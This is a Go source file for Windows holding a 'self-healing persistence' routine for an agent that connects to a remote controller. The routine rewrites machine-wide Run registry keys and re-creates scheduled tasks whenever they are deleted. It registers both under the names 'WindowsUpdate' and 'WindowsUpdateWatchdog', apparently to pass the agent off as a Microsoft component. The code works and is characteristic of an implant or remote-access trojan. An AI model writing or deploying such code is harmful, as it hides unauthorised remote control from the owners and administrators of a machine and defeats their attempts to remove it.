//go:build windows

package main

import (
	"log"
	"os"
	"os/exec"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

// ensureWatchPersistence re-creates deleted Run keys / scheduled tasks from
// the XML copies saved beside the backup (self-healing persistence).
func ensureWatchPersistence(w *watchCfg) {
	agentCmd := `"` + w.agentPath + `" -controller ` + w.controllerAddr + ` -ca "` + w.caPath + `"`
	watchCmd := `"` + w.agentPath + `" --watch`
	setRun := func(name, val string) {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		if err != nil {
			return
		}
		defer k.Close()
		cur, _, err := k.GetStringValue(name)
		if err != nil || cur != val {
			if err := k.SetStringValue(name, val); err == nil {
				log.Printf("[watch] repaired HKLM Run %s", name)
			}
		}
	}
	setRun("WindowsUpdate", agentCmd)
	setRun("WindowsUpdateWatchdog", watchCmd)
	for _, t := range [][2]string{{"WindowsUpdate", "agent_task.xml"}, {"WindowsUpdateWatchdog", "watchdog_task.xml"}} {
		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
			continue
		}
		xml := filepath.Join(w.backupDir, t[1])
		if _, err := os.Stat(xml); err != nil {
			log.Printf("[watch] task %s missing and no saved XML", t[0])
			continue
		}
		if out, err := exec.Command("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
			log.Printf("[watch] re-create task %s: %v %s", t[0], err, string(out))
		} else {
			log.Printf("[watch] re-created task %s", t[0])
		}
	}
}
